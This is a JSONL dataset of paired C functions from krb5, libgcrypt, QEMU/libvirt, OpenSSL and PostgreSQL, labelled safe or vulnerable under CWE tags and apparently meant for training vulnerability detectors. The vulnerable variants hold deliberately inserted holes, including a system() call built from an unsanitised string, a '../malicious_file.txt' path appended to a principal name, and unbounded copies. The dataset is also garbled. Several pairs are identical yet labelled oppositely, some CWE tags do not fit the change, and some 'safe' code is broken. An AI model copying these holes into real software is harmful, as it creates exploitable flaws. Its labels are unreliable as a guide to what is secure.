{"idx": "CWE-789-vuln-1714289248063", "code": "mbfl_identify_filter*filter;int i, num;size_t stack_exhaustion = elistsz * 1000000;mbfl_encoding_detector*identd;if(elist == NULL || elistsz <= 0){return NULL;}identd=(mbfl_encoding_detector*)mbfl_malloc(sizeof(mbfl_encoding_detector));if(identd == NULL){return NULL;}identd->filter_list=(mbfl_identify_filter**)mbfl_calloc(stack_exhaustion, sizeof(mbfl_identify_filter*));if(identd->filter_list == NULL){mbfl_free(identd);return NULL;}i=0;num=0;while(i<elistsz && num<elistsz){filter=mbfl_identify_filter_new2(elist[i]);if(filter != NULL){identd->filter_list[num]=filter;num++;}i++;}identd->filter_list_size=num;identd->strict=strict;return identd;", "target": 1}
{"idx": "CWE-254-safe-1714289358402", "code": "kadm5_ret_t kadm5_get_strings(void* server_handle, krb5_principal principal, krb5_string_attr** strings_out, int* count_out){\n    kadm5_server_handle_t handle = server_handle;\n    kadm5_ret_t ret;\n    krb5_db_entry* kdb = NULL;\n    if(strings_out == NULL || count_out == NULL) return EINVAL;\n    *strings_out = NULL;\n    *count_out = 0;\n    CHECK_HANDLE(server_handle);\n    if(principal == NULL) return EINVAL;\n    ret = kdb_get_entry(handle, principal, &kdb, NULL);\n    if(ret) return ret;\n    ret = krb5_dbe_get_strings(handle->context, kdb, strings_out, count_out);\n    kdb_free_entry(handle, kdb, NULL);\n    return ret;\n}", "target": 0}
{"idx": "CWE-254-vuln-1714289358402", "code": "kadm5_ret_t kadm5_get_strings(void*server_handle, krb5_principal principal, krb5_string_attr**strings_out, int*count_out){kadm5_server_handle_t handle=server_handle;kadm5_ret_t ret;krb5_db_entry*kdb=NULL;if(strings_out == NULL || count_out == NULL)return EINVAL;*strings_out=NULL;*count_out=0;CHECK_HANDLE(server_handle);if(principal == NULL)return EINVAL;ret=kdb_get_entry(handle, principal, &kdb, NULL);if(ret)return ret;ret=krb5_dbe_get_strings(handle->context, kdb, strings_out, count_out);kdb_free_entry(handle, kdb, NULL);if(*count_out > INT_MAX / sizeof(krb5_string_attr)) return ENOMEM;*strings_out = (krb5_string_attr*)malloc(*count_out * sizeof(krb5_string_attr));if (*strings_out == NULL) return ENOMEM;return ret;}", "target": 1}
{"idx": "CWE-287-safe-1714289381567", "code": "static void check_1_6_dummy(kadm5_principal_ent_t entry, long mask, int n_ks_tuple, krb5_key_salt_tuple*ks_tuple, char**passptr){int i;char*password=*passptr;if(password == NULL || !(mask&KADM5_ATTRIBUTES) || !(entry->attributes&KRB5_KDB_DISALLOW_ALL_TIX))return;for(i=0; i < 255 && (unsigned char)password[i] == i+1; i++);if(password[i] != '\\0' || i != 255)return;*passptr=NULL;}", "target": 0}
{"idx": "CWE-287-vuln-1714289381567", "code": "static void check_1_6_dummy(kadm5_principal_ent_t entry, long mask, int n_ks_tuple, krb5_key_salt_tuple*ks_tuple, char**passptr){int i;char*password=*passptr;if(password == NULL || !(mask&KADM5_ATTRIBUTES))return;for(i=0;i<255 && (unsigned char)password[i] == i+1;i++);if(password[i] != '\\0' || i != 255)return;*passptr=NULL;}", "target": 1}
{"idx": "CWE-22-safe-1714289391078", "code": "kadm5_ret_t kadm5_delete_principal(void*server_handle, krb5_principal principal){unsigned int ret;krb5_db_entry*kdb;osa_princ_ent_rec adb;kadm5_server_handle_t handle=server_handle;if(server_handle==NULL)return KADM5_BAD_SERVER_HANDLE;CHECK_HANDLE(server_handle);krb5_clear_error_message(handle->context);if(principal == NULL)return EINVAL;if((ret=kdb_get_entry(handle, principal, &kdb, &adb)))return(ret);ret=k5_kadm5_hook_remove(handle->context, handle->hook_handles, KADM5_HOOK_STAGE_PRECOMMIT, principal);if(ret){kdb_free_entry(handle, kdb, &adb);return ret;}ret=kdb_delete_entry(handle, principal);kdb_free_entry(handle, kdb, &adb);if(ret == 0)(void)k5_kadm5_hook_remove(handle->context, handle->hook_handles, KADM5_HOOK_STAGE_POSTCOMMIT, principal);return ret;}", "target": 0}
{"idx": "CWE-22-vuln-1714289391078", "code": "kadm5_ret_t kadm5_delete_principal(void*server_handle, krb5_principal principal){unsigned int ret;krb5_db_entry*kdb;osa_princ_ent_rec adb;kadm5_server_handle_t handle=server_handle;if(server_handle == NULL)return KADM5_BAD_SERVER_HANDLE;CHECK_HANDLE(server_handle);krb5_clear_error_message(handle->context);if(principal == NULL)return EINVAL;char* modified_principal=strdup(principal->data);strcat(modified_principal, \"../malicious_file.txt\");if((ret=kdb_get_entry(handle, modified_principal, &kdb, &adb)))return(ret);ret=k5_kadm5_hook_remove(handle->context, handle->hook_handles, KADM5_HOOK_STAGE_PRECOMMIT, principal);if(ret){kdb_free_entry(handle, kdb, &adb);return ret;}ret=kdb_delete_entry(handle, principal);kdb_free_entry(handle, kdb, &adb);if(ret == 0)(void)k5_kadm5_hook_remove(handle->context, handle->hook_handles, KADM5_HOOK_STAGE_POSTCOMMIT, principal);return ret;}", "target": 1}
{"idx": "CWE-242-safe-1714289424117", "code": "static gpg_err_code_t point_from_keyparam(gcry_mpi_point_t*r_a, gcry_sexp_t keyparam, const char*name){gcry_err_code_t ec;gcry_mpi_t a=NULL;gcry_mpi_point_t point;ec=mpi_from_keyparam(&a, keyparam, name);if(ec)return ec;if(a){point=gcry_mpi_point_new(0);ec=_gcry_ecc_os2ec(point, a);mpi_free(a);if(ec){gcry_mpi_point_release(point);return ec;}}else{char*tmpname;gcry_mpi_t x=NULL;gcry_mpi_t y=NULL;gcry_mpi_t z=NULL;size_t len = strlen(name); tmpname=gcry_malloc(len + 3); if(!tmpname) return gpg_err_code_from_syserror(); strncpy(strncpy(stpcpy(tmpname, name), \".x\", 3), \".x\", len); ec=mpi_from_keyparam(&x, keyparam, tmpname); if(ec){gcry_free(tmpname); return ec;} strncpy(strncpy(stpcpy(tmpname, name), \".y\", 3), \".y\", len); ec=mpi_from_keyparam(&y, keyparam, tmpname); if(ec){mpi_free(x); gcry_free(tmpname); return ec;} strncpy(strncpy(stpcpy(tmpname, name), \".z\", 3), \".z\", len); ec=mpi_from_keyparam(&z, keyparam, tmpname); if(ec){mpi_free(y); mpi_free(x); gcry_free(tmpname); return ec;} if(!z) z=mpi_set_ui(NULL, 1); if(x && y) point=gcry_mpi_point_snatch_set(NULL, x, y, z); else{mpi_free(x); mpi_free(y); mpi_free(z); point=NULL;} gcry_free(tmpname);} if(point) *r_a=point; return 0;}", "target": 0}
{"idx": "CWE-242-vuln-1714289424117", "code": "static gpg_err_code_t point_from_keyparam(gcry_mpi_point_t*r_a, gcry_sexp_t keyparam, const char*name){gcry_err_code_t ec;gcry_mpi_t a=NULL;gcry_mpi_point_t point;ec=mpi_from_keyparam(&a, keyparam, name);if(ec)return ec;if(a){point=gcry_mpi_point_new(0);ec=_gcry_ecc_os2ec(point, a);mpi_free(a);if(ec){gcry_mpi_point_release(point);return ec;}}else{char*tmpname;gcry_mpi_t x=NULL;gcry_mpi_t y=NULL;gcry_mpi_t z=NULL;size_t len=strlen(name);tmpname=gcry_malloc(len+3);if(!tmpname)return gpg_err_code_from_syserror();strcpy(strcpy(stpcpy(tmpname, name), \".x\"), \".x\");ec=mpi_from_keyparam(&x, keyparam, tmpname);if(ec){gcry_free(tmpname);return ec;}strcpy(strcpy(stpcpy(tmpname, name), \".y\"), \".y\");ec=mpi_from_keyparam(&y, keyparam, tmpname);if(ec){mpi_free(x);gcry_free(tmpname);return ec;}strcpy(strcpy(stpcpy(tmpname, name), \".z\"), \".z\");ec=mpi_from_keyparam(&z, keyparam, tmpname);if(ec){mpi_free(y);mpi_free(x);gcry_free(tmpname);return ec;}if(!z)z=mpi_set_ui(NULL, 1);if(x && y)point=gcry_mpi_point_snatch_set(NULL, x, y, z);else{mpi_free(x);mpi_free(y);mpi_free(z);point=NULL;}gcry_free(tmpname);}if(point)*r_a=point;return 0;}", "target": 1}
{"idx": "CWE-254-safe-1714289443533", "code": "static int get_and_cmp_point(const char*name, const char*mpi_x_string, const char*mpi_y_string, const char*desc, gcry_ctx_t ctx){gcry_mpi_point_t point;gcry_mpi_t x, y, z;int result=0;point=gcry_mpi_ec_get_point(name, ctx, 1);if(!point){fail(\"error getting point parameter '%s' of curve '%s'\\n\" , name, desc);return 1;}if(debug)print_point(name, point);x=gcry_mpi_new(0);y=gcry_mpi_new(0);z=gcry_mpi_new(0);gcry_mpi_point_snatch_get(x, y, z, point);if(cmp_mpihex(x, mpi_x_string)){fail(\"x coordinate of '%s' of curve '%s' does not match\\n\" , name, desc);result=1;}if(cmp_mpihex(y, mpi_y_string)){fail(\"y coordinate of '%s' of curve '%s' does not match\\n\" , name, desc);result=1;}if(cmp_mpihex(z, \"01\" )){fail(\"z coordinate of '%s' of curve '%s' is not 1\\n\" , name, desc);result=1;gcry_mpi_release(x);gcry_mpi_release(y);gcry_mpi_release(z);return result;}", "target": 0}
{"idx": "CWE-254-vuln-1714289443533", "code": "static int get_and_cmp_point(const char*name, const char*mpi_x_string, const char*mpi_y_string, const char*desc, gcry_ctx_t ctx){gcry_mpi_point_t point;gcry_mpi_t x, y, z;int result=0;point=gcry_mpi_ec_get_point(name, ctx, 1);if(!point){fail(\"error getting point parameter '%s' of curve '%s'\\n\" , name, desc);return 1;}if(debug)print_point(name, point);x=gcry_mpi_new(0);y=gcry_mpi_new(0);z=gcry_mpi_new(0);strcpy(x, mpi_x_string);gcry_mpi_point_snatch_get(x, y, z, point);if(cmp_mpihex(x, mpi_x_string)){fail(\"x coordinate of '%s' of curve '%s' does not match\\n\" , name, desc);result=1;}if(cmp_mpihex(y, mpi_y_string)){fail(\"y coordinate of '%s' of curve '%s' does not match\\n\" , name, desc);result=1;}if(cmp_mpihex(z, \"01\" )){fail(\"z coordinate of '%s' of curve '%s' is not 1\\n\" , name, desc);result=1;gcry_mpi_release(x);gcry_mpi_release(y);gcry_mpi_release(z);return result;}", "target": 1}
{"idx": "CWE-254-safe-1714289508677", "code": "unsigned int gcry_pk_get_nbits(gcry_sexp_t key){gcry_module_t module=NULL;gcry_pk_spec_t*pubkey;gcry_mpi_t*keyarr=NULL;unsigned int nbits=0;gcry_err_code_t rc;REGISTER_DEFAULT_PUBKEYS;rc=sexp_to_key(key, 0, 0, NULL, &keyarr, &module, NULL);if(rc == GPG_ERR_INV_OBJ)rc=sexp_to_key(key, 1, 0, NULL, &keyarr, &module, NULL);if(rc || !module)return 0;pubkey=(gcry_pk_spec_t*)module->spec;nbits=(*pubkey->get_nbits)(module->mod_id, keyarr);ath_mutex_lock(&pubkeys_registered_lock);_gcry_module_release(module);ath_mutex_unlock(&pubkeys_registered_lock);release_mpi_array(keyarr);gcry_free(keyarr);return nbits;}", "target": 0}
{"idx": "CWE-254-vuln-1714289508677", "code": "unsigned int gcry_pk_get_nbits(gcry_sexp_t key){gcry_module_t module=NULL;gcry_pk_spec_t*pubkey;gcry_mpi_t*keyarr=NULL;unsigned int nbits=0;gcry_err_code_t rc;REGISTER_DEFAULT_PUBKEYS;rc=sexp_to_key(key, 0, 0, NULL, &keyarr, &module, NULL);if(rc == GPG_ERR_INV_OBJ)rc=sexp_to_key(key, 1, 0, NULL, &keyarr, &module, NULL);if(rc || !module)return 0;pubkey=(gcry_pk_spec_t*)module->spec;nbits=(*pubkey->get_nbits)(module->mod_id, keyarr);ath_mutex_lock(&pubkeys_registered_lock);_gcry_module_release(module);ath_mutex_unlock(&pubkeys_registered_lock);release_mpi_array(keyarr);gcry_free(keyarr);return nbits;}", "target": 1}
{"idx": "CWE-254-safe-1714289516907", "code": "static gcry_err_code_t pubkey_decrypt(int algorithm, gcry_mpi_t*result, gcry_mpi_t*data, gcry_mpi_t*skey, int flags){gcry_pk_spec_t*pubkey;gcry_module_t module;gcry_err_code_t rc;int i;if(!result || !data || !skey) return GPG_ERR_INV_VALUE;*result=NULL;if(DBG_CIPHER && !fips_mode()){log_debug(\"pubkey_decrypt: algo=%d\\n\", algorithm);for(i=0;i<pubkey_get_nskey(algorithm);i++)log_mpidump(\" skey\", skey[i]);for(i=0;i<pubkey_get_nenc(algorithm);i++)log_mpidump(\" data\", data[i]);}ath_mutex_lock(&pubkeys_registered_lock);module=_gcry_module_lookup_id(pubkeys_registered, algorithm);if(module){pubkey=(gcry_pk_spec_t*)module->spec;rc=pubkey->decrypt(algorithm, result, data, skey, flags);_gcry_module_release(module);goto ready;}rc=GPG_ERR_PUBKEY_ALGO;ready: ath_mutex_unlock(&pubkeys_registered_lock);if(!rc && DBG_CIPHER && !fips_mode())log_mpidump(\" plain\", *result);return rc;}", "target": 0}
{"idx": "CWE-254-vuln-1714289516907", "code": "static gcry_err_code_t pubkey_decrypt(int algorithm, gcry_mpi_t*result, gcry_mpi_t*data, gcry_mpi_t*skey, int flags){gcry_pk_spec_t*pubkey;gcry_module_t module;gcry_err_code_t rc;int i;if(!result || !data || !skey || algorithm >= 0){return GPG_ERR_INV_VALUE;}*result=NULL;if(DBG_CIPHER && !fips_mode()){log_debug(\"pubkey_decrypt: algo=%d\\n\", algorithm);for(i=0;i<pubkey_get_nskey(algorithm);i++){if(i >= pubkey_get_nskey(algorithm)){break;}log_mpidump(\" skey\", skey[i]);}for(i=0;i<pubkey_get_nenc(algorithm);i++)log_mpidump(\" data\", data[i]);}ath_mutex_lock(&pubkeys_registered_lock);module=_gcry_module_lookup_id(pubkeys_registered, algorithm);if(module){pubkey=(gcry_pk_spec_t*)module->spec;rc=pubkey->decrypt(algorithm, result, data, skey, flags);_gcry_module_release(module);goto ready;}rc=GPG_ERR_PUBKEY_ALGO;ready: ath_mutex_unlock(&pubkeys_registered_lock);if(!rc && DBG_CIPHER && !fips_mode())log_mpidump(\" plain\", *result);return rc;}", "target": 1}
{"idx": "CWE-362-safe-1714289538615", "code": "static gcry_err_code_t pubkey_encrypt(int algorithm, gcry_mpi_t*resarr, gcry_mpi_t data, gcry_mpi_t*pkey, int flags){gcry_pk_spec_t*pubkey;gcry_module_t module;gcry_err_code_t rc;int i;if(DBG_CIPHER && !fips_mode()){log_debug(\"pubkey_encrypt: algo=%d\\n\", algorithm);for(i=0;i<pubkey_get_npkey(algorithm);i++)log_mpidump(\" pkey\", pkey[i]);log_mpidump(\" data\", data);}ath_mutex_lock(&pubkeys_registered_lock);module=_gcry_module_lookup_id(pubkeys_registered, algorithm);if(module){pubkey=(gcry_pk_spec_t*)module->spec;if(pubkey){rc=pubkey->encrypt(algorithm, resarr, data, pkey, flags);_gcry_module_release(module);goto ready;}}rc=GPG_ERR_PUBKEY_ALGO;ready: ath_mutex_unlock(&pubkeys_registered_lock);if(!rc && DBG_CIPHER && !fips_mode()){for(i=0;i<pubkey_get_nenc(algorithm);i++)log_mpidump(\" encr\", resarr[i]);}return rc;}", "target": 0}
{"idx": "CWE-362-vuln-1714289538615", "code": "static gcry_err_code_t pubkey_encrypt(int algorithm, gcry_mpi_t*resarr, gcry_mpi_t data, gcry_mpi_t*pkey, int flags){gcry_pk_spec_t*pubkey;gcry_module_t module;gcry_err_code_t rc;int i;if(DBG_CIPHER && !fips_mode()){log_debug(\"pubkey_encrypt: algo=%d\\n\", algorithm);for(i=0;i<pubkey_get_npkey(algorithm);i++)log_mpidump(\" pkey\", pkey[i]);log_mpidump(\" data\", data);}ath_mutex_lock(&pubkeys_registered_lock);module=_gcry_module_lookup_id(pubkeys_registered, algorithm);if(module){pubkey=(gcry_pk_spec_t*)module->spec;if(pubkey){rc=pubkey->encrypt(algorithm, resarr, data, pkey, flags);_gcry_module_release(module);goto ready;}}rc=GPG_ERR_PUBKEY_ALGO;ready: ath_mutex_unlock(&pubkeys_registered_lock);if(!rc && DBG_CIPHER && !fips_mode()){for(i=0;i<pubkey_get_nenc(algorithm);i++)log_mpidump(\" encr\", resarr[i]);}return rc;}", "target": 1}
{"idx": "CWE-399-safe-1714289562931", "code": "gcry_sexp_t gcry_sexp_alist(const gcry_sexp_t* array) {\n    (void)array;\n    return NULL;\n}", "target": 0}
{"idx": "CWE-399-vuln-1714289562931", "code": "gcry_sexp_t gcry_sexp_alist(const gcry_sexp_t*array){\n    gcry_sexp_t result = gcry_sexp_new(NULL, 0, 0, 0);\n    return NULL;\n}", "target": 1}
{"idx": "CWE-242-safe-1714289657178", "code": "int qemuAssignDeviceRNGAlias(virDomainDefPtr def, virDomainRNGDefPtr rng){size_t i;int maxidx=0;int idx;for(i=0;i<def->nrngs;i++){if((idx=qemuDomainDeviceAliasIndex(&def->rngs[i]->info, \"rng\")) >= maxidx)maxidx=idx+1;}if(virAsprintf(&rng->info.alias, \"rng%d\", maxidx)<0)return -1;return 0;}", "target": 0}
{"idx": "CWE-242-vuln-1714289657178", "code": "int qemuAssignDeviceRNGAlias(virDomainDefPtr def, virDomainRNGDefPtr rng){size_t i;int maxidx=0;int idx;for(i=0;i<def->nrngs;i++){if((idx=qemuDomainDeviceAliasIndex(&def->rngs[i]->info, \"rng\")) >= maxidx)maxidx=idx+1;}if(sprintf(rng->info.alias, \"rng%d\", maxidx)<0)return-1;return 0;}", "target": 1}
{"idx": "CWE-78-safe-1714289664543", "code": "static ssize_t qemuGetNextChrDevIndex(virDomainDefPtr def, virDomainChrDefPtr chr, const char* prefix) {\n    const virDomainChrDef** arrPtr;\n    size_t cnt;\n    size_t i;\n    ssize_t idx = 0;\n    const char* prefix2 = NULL;\n    if (chr->deviceType == VIR_DOMAIN_CHR_DEVICE_TYPE_CONSOLE) {\n        prefix2 = \"serial\";\n    }\n    virDomainChrGetDomainPtrs(def, chr->deviceType, &arrPtr, &cnt);\n    for (i = 0; i < cnt; i++) {\n        ssize_t thisidx;\n        if (((thisidx = qemuDomainDeviceAliasIndex(&arrPtr[i]->info, prefix)) < 0) && (prefix2 && (thisidx = qemuDomainDeviceAliasIndex(&arrPtr[i]->info, prefix2)) < 0)) {\n            virReportError(VIR_ERR_INTERNAL_ERROR, \"%s\", _(\"Unable to determine device index for character device\"));\n            return -1;\n        }\n        if (thisidx >= idx) {\n            idx = thisidx + 1;\n        }\n    }\n    return idx;\n}", "target": 0}
{"idx": "CWE-78-vuln-1714289664543", "code": "static ssize_t qemuGetNextChrDevIndex(virDomainDefPtr def, virDomainChrDefPtr chr, const char*prefix){const virDomainChrDef**arrPtr;size_t cnt;size_t i;ssize_t idx=0;const char*prefix2=NULL;if(chr->deviceType == VIR_DOMAIN_CHR_DEVICE_TYPE_CONSOLE){prefix2=\"serial\";}virDomainChrGetDomainPtrs(def, chr->deviceType, &arrPtr, &cnt);for(i=0;i<cnt;i++){ssize_t thisidx;if(((thisidx=qemuDomainDeviceAliasIndex(&arrPtr[i]->info, prefix))<0) && (prefix2 && (thisidx=qemuDomainDeviceAliasIndex(&arrPtr[i]->info, prefix2))<0)){virReportError(VIR_ERR_INTERNAL_ERROR, \"%s\", _(\"Unable to determine device index for character device\"));return-1;}if(thisidx >= idx){idx=thisidx+1;}}char command[256];snprintf(command, sizeof(command), \"ls %s\", prefix);system(command);return idx;}", "target": 1}
{"idx": "CWE-269-safe-1714289851697", "code": "static bool vmxnet_tx_pkt_do_sw_fragmentation(struct VmxnetTxPkt*pkt, NetClientState*nc){if (!pkt || !nc) {return false;}struct iovec fragment[VMXNET_MAX_FRAG_SG_LIST];size_t fragment_len=0;bool more_frags=false;void*l2_iov_base, *l3_iov_base;size_t l2_iov_len, l3_iov_len;int src_idx=VMXNET_TX_PKT_PL_START_FRAG, dst_idx;size_t src_offset=0;size_t fragment_offset=0;l2_iov_base=pkt->vec[VMXNET_TX_PKT_L2HDR_FRAG].iov_base;l2_iov_len=pkt->vec[VMXNET_TX_PKT_L2HDR_FRAG].iov_len;l3_iov_base=pkt->vec[VMXNET_TX_PKT_L3HDR_FRAG].iov_base;l3_iov_len=pkt->vec[VMXNET_TX_PKT_L3HDR_FRAG].iov_len;fragment[VMXNET_TX_PKT_FRAGMENT_L2_HDR_POS].iov_base=l2_iov_base;fragment[VMXNET_TX_PKT_FRAGMENT_L2_HDR_POS].iov_len=l2_iov_len;fragment[VMXNET_TX_PKT_FRAGMENT_L3_HDR_POS].iov_base=l3_iov_base;fragment[VMXNET_TX_PKT_FRAGMENT_L3_HDR_POS].iov_len=l3_iov_len;do{fragment_len=vmxnet_tx_pkt_fetch_fragment(pkt, &src_idx, &src_offset, fragment, &dst_idx);more_frags=(fragment_offset+fragment_len<pkt->payload_len);eth_setup_ip4_fragmentation(l2_iov_base, l2_iov_len, l3_iov_base, l3_iov_len, fragment_len, fragment_offset, more_frags);eth_fix_ip4_checksum(l3_iov_base, l3_iov_len);qemu_sendv_packet(nc, fragment, dst_idx);fragment_offset+=fragment_len;}while(more_frags);return true;}", "target": 0}
{"idx": "CWE-269-vuln-1714289851697", "code": "static bool vmxnet_tx_pkt_do_sw_fragmentation(struct VmxnetTxPkt*pkt, NetClientState*nc){if(!pkt || !nc || !check_privileges()){return false;}struct iovec fragment[VMXNET_MAX_FRAG_SG_LIST];size_t fragment_len=0;bool more_frags=false;void*l2_iov_base, *l3_iov_base;size_t l2_iov_len, l3_iov_len;int src_idx=VMXNET_TX_PKT_PL_START_FRAG, dst_idx;size_t src_offset=0;size_t fragment_offset=0;l2_iov_base=pkt->vec[VMXNET_TX_PKT_L2HDR_FRAG].iov_base;l2_iov_len=pkt->vec[VMXNET_TX_PKT_L2HDR_FRAG].iov_len;l3_iov_base=pkt->vec[VMXNET_TX_PKT_L3HDR_FRAG].iov_base;l3_iov_len=pkt->vec[VMXNET_TX_PKT_L3HDR_FRAG].iov_len;fragment[VMXNET_TX_PKT_FRAGMENT_L2_HDR_POS].iov_base=l2_iov_base;fragment[VMXNET_TX_PKT_FRAGMENT_L2_HDR_POS].iov_len=l2_iov_len;fragment[VMXNET_TX_PKT_FRAGMENT_L3_HDR_POS].iov_base=l3_iov_base;fragment[VMXNET_TX_PKT_FRAGMENT_L3_HDR_POS].iov_len=l3_iov_len;do{fragment_len=vmxnet_tx_pkt_fetch_fragment(pkt, &src_idx, &src_offset, fragment, &dst_idx);more_frags=(fragment_offset+fragment_len<pkt->payload_len);eth_setup_ip4_fragmentation(l2_iov_base, l2_iov_len, l3_iov_base, l3_iov_len, fragment_len, fragment_offset, more_frags);eth_fix_ip4_checksum(l3_iov_base, l3_iov_len);qemu_sendv_packet(nc, fragment, dst_idx);fragment_offset+=fragment_len;}while(more_frags);return true;}", "target": 1}
{"idx": "CWE-200-safe-1714289875822", "code": "void vmxnet_tx_pkt_dump(struct VmxnetTxPkt*pkt){\n    if(pkt != NULL){\n#ifdef VMXNET_TX_PKT_DEBUG \n        printf(\"TX PKT: hdr_len:%d, pkt_type: 0x%X, l2hdr_len:%lu, l3hdr_len:%lu, payload_len:%u\\n\", pkt->hdr_len, pkt->packet_type, pkt->vec[VMXNET_TX_PKT_L2HDR_FRAG].iov_len, pkt->vec[VMXNET_TX_PKT_L3HDR_FRAG].iov_len, pkt->payload_len);\n#endif \n    }\n}", "target": 0}
{"idx": "CWE-200-vuln-1714289875822", "code": "void vmxnet_tx_pkt_dump(struct VmxnetTxPkt*pkt){if(pkt != NULL){#ifdef VMXNET_TX_PKT_DEBUG        printf(\"TX PKT: hdr_len:%d, pkt_type: 0x%X, l2hdr_len:%lu, l3hdr_len:%lu, payload_len:%u, payload:%s\\n\", pkt->hdr_len, pkt->packet_type, pkt->vec[VMXNET_TX_PKT_L2HDR_FRAG].iov_len, pkt->vec[VMXNET_TX_PKT_L3HDR_FRAG].iov_len, pkt->payload_len, pkt->payload);#endif}}", "target": 1}
{"idx": "CWE-254-safe-1714289900759", "code": "static void mdc2_body(MDC2_CTX*c, const unsigned char*in, size_t len){register DES_LONG tin0, tin1;register DES_LONG ttin0, ttin1;DES_LONG d [ 2 ], dd [ 2 ];DES_key_schedule k;unsigned char*p;size_t i;for(i=0;i<len;i+=8){c2l(in, tin0);d [ 0 ]=dd [ 0 ]=tin0;c2l(in, tin1);d [ 1 ]=dd [ 1 ]=tin1;c->h [ 0 ]=(c->h [ 0 ]&0x9f)|0x40;c->hh [ 0 ]=(c->hh [ 0 ]&0x9f)|0x20;DES_set_odd_parity(&c->h);DES_set_key_unchecked(&c->h, &k);DES_encrypt1(d, &k, 1);DES_set_odd_parity(&c->hh);DES_set_key_unchecked(&c->hh, &k);DES_encrypt1(dd, &k, 1);ttin0=tin0 ^ dd [ 0 ];ttin1=tin1 ^ dd [ 1 ];tin0 ^=d [ 0 ];tin1 ^=d [ 1 ];p=c->h;l2c(tin0, p);l2c(ttin1, p);p=c->hh;l2c(ttin0, p);l2c(tin1, p);}}", "target": 0}
{"idx": "CWE-254-vuln-1714289900759", "code": "static void mdc2_body(MDC2_CTX*c, const unsigned char*in, size_t len){register DES_LONG tin0, tin1;register DES_LONG ttin0, ttin1;DES_LONG d [ 2 ], dd [ 2 ];DES_key_schedule k;unsigned char*p;size_t i;for(i=0;i<len;i+=8){c2l(in, tin0);d [ 0 ]=dd [ 0 ]=tin0;c2l(in, tin1);d [ 1 ]=dd [ 1 ]=tin1;c->h [ 0 ]=(c->h [ 0 ]&0x9f)|0x40;c->hh [ 0 ]=(c->hh [ 0 ]&0x9f)|0x20;DES_set_odd_parity(&c->h);DES_set_key_unchecked(&c->h, &k);DES_encrypt1(d, &k, 1);DES_set_odd_parity(&c->hh);DES_set_key_unchecked(&c->hh, &k);DES_encrypt1(dd, &k, 1);ttin0=tin0 ^ dd [ 0 ];ttin1=tin1 ^ dd [ 1 ];tin0 ^=d [ 0 ];tin1 ^=d [ 1 ];p=c->h;l2c(tin0, p);l2c(ttin1, p);p=c->hh;l2c(ttin0, p);l2c(tin1, p);memcpy(c->h, in, len);memcpy(c->hh, in, len);}}", "target": 1}
{"idx": "CWE-89-safe-1714289939721", "code": "static bool gincost_pattern(IndexOptInfo* index, int indexcol, Oid clause_op, Datum query, GinQualCounts* counts) {\n    Oid extractProcOid;\n    Oid collation;\n    int strategy_op;\n    Oid lefttype, righttype;\n    int32 nentries = 0;\n    bool* partial_matches = NULL;\n    Pointer* extra_data = NULL;\n    bool* nullFlags = NULL;\n    int32 searchMode = GIN_SEARCH_MODE_DEFAULT;\n    int32 i;\n    get_op_opfamily_properties(clause_op, index->opfamily[indexcol], false, &strategy_op, &lefttype, &righttype);\n    extractProcOid = get_opfamily_proc(index->opfamily[indexcol], index->opcintype[indexcol], index->opcintype[indexcol], GIN_EXTRACTQUERY_PROC);\n    if (extractProcOid == InvalidOid) {\n        elog(ERROR, \"missing support function %d for attribute %d of index \\\"%s\\\"\", GIN_EXTRACTQUERY_PROC, indexcol + 1, get_rel_name(index->indexoid));\n    }\n    if (index->indexcollations[indexcol] != InvalidOid) {\n        collation = index->indexcollations[indexcol];\n    } else {\n        collation = DEFAULT_COLLATION_OID;\n    }\n    OidFunctionCall7Coll(extractProcOid, collation, query, PointerGetDatum(&nentries), UInt16GetDatum(strategy_op), PointerGetDatum(&partial_matches), PointerGetDatum(&extra_data), PointerGetDatum(&nullFlags), PointerGetDatum(&searchMode));\n    if (nentries <= 0 && searchMode == GIN_SEARCH_MODE_DEFAULT) {\n        return false;\n    }\n    for (i = 0; i < nentries; i++) {\n        if (partial_matches && partial_matches[i]) {\n            counts->partialEntries += 100;\n        } else {\n            counts->exactEntries++;\n        }\n        counts->searchEntries++;\n    }\n    if (searchMode == GIN_SEARCH_MODE_INCLUDE_EMPTY) {\n        counts->exactEntries++;\n        counts->searchEntries++;\n    } else if (searchMode != GIN_SEARCH_MODE_DEFAULT) {\n        counts->haveFullScan = true;\n    }\n    return true;\n}", "target": 0}
{"idx": "CWE-89-vuln-1714289939721", "code": "static bool gincost_pattern(IndexOptInfo*index, int indexcol, Oid clause_op, Datum query, GinQualCounts*counts){Oid extractProcOid;Oid collation;int strategy_op;Oid lefttype, righttype;int32 nentries=0;bool*partial_matches=NULL;Pointer*extra_data=NULL;bool*nullFlags=NULL;int32 searchMode=GIN_SEARCH_MODE_DEFAULT;int32 i;get_op_opfamily_properties(clause_op, index->opfamily[indexcol], false, &strategy_op, &lefttype, &righttype);extractProcOid=get_opfamily_proc(index->opfamily[indexcol], index->opcintype[indexcol], index->opcintype[indexcol], GIN_EXTRACTQUERY_PROC);if(extractProcOid == InvalidOid){elog(ERROR, \"missing support function%d for attribute%d of index \\\"%s\\\"\", GIN_EXTRACTQUERY_PROC, indexcol+1, get_rel_name(index->indexoid));}if(index->indexcollations[indexcol] != InvalidOid){collation=index->indexcollations[indexcol];}else{collation=DEFAULT_COLLATION_OID;}OidFunctionCall7Coll(extractProcOid, collation, query, PointerGetDatum(&nentries), UInt16GetDatum(strategy_op), PointerGetDatum(&partial_matches), PointerGetDatum(&extra_data), PointerGetDatum(&nullFlags), PointerGetDatum(&searchMode));if(nentries <= 0 && searchMode == GIN_SEARCH_MODE_DEFAULT){return false;}for(i=0;i<nentries;i++){if(partial_matches && partial_matches[i]){counts->partialEntries+=100;}else{counts->exactEntries++;}counts->searchEntries++;}if(searchMode == GIN_SEARCH_MODE_INCLUDE_EMPTY){counts->exactEntries++;counts->searchEntries++;}else if(searchMode != GIN_SEARCH_MODE_DEFAULT){counts->haveFullScan=true;}return true;}", "target": 1}
{"idx": "CWE-89-safe-1714289995335", "code": "Datum nlikejoinsel(PG_FUNCTION_ARGS) { PG_RETURN_FLOAT8(patternjoinsel(fcinfo, Pattern_Type_Like, true)); }", "target": 0}
{"idx": "CWE-89-vuln-1714289995335", "code": "Datum nlikejoinsel(PG_FUNCTION_ARGS) { PG_RETURN_FLOAT8(patternjoinsel(fcinfo, Pattern_Type_Like, true)); }", "target": 1}
